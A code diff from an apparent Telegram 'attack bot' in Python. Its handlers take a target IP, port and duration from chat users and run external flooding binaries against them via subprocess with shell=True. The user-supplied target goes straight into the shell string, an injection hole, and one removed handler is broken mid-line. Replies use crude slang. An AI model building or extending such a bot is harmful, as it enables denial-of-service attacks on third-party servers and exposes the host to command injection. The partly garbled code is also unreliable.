@@ -302,51 +302,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./2111 {target} {port} {time} 800"
-                    subprocess.run(full_command, shell=True)
-
-                    response = "Chudai completed successfully."
-                except Exception as e:
-                    response = f"Error during attack: {str(e)}"
-                finally:
-                    attack_running = False  # Reset the attack state
-        else:
-            response = "Usage: /chodo <target> <port> <time>"
-    else:
-        response = "Nhi milega GROUP per Free hai Wha use krle."
-
-    bot.reply_to(message, response)
-
-
-# Handler for /ruko command
-@bot.message_handler(commands=['ruko'])
-def handle_attack(message):
-    global attack_running
-
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        if attack_running:
-            response = "Abhi Chudai  Nhi chal rha jab Chudai chlega tab krna or jo ip glitch ho sirf usper."
-            bot.reply_to(message, response)
-            return
-
-        command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, port, and time
-            target = command[1]
-            port = int(command[2])  # Convert port to integer
-            time = int(command[3])  # Convert time to integer
-
-            if time > 240:
-                response = "Error: Time interval must be less than 240"
-            else:
-                attack_running = True  # Set the attack state to running
-                try:
-                    record_command_logs(user_id, '/chodo', target, port, time)
-                    log_command(user_id, target, port, time)
-                    start_attack_reply(message, target, port, time)
-
-                    # Simulate attack process
-                    full_command = f"ctrl c
+                    full_command = f"./IZUNA {target} {port} {time} 1 900"
                     subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
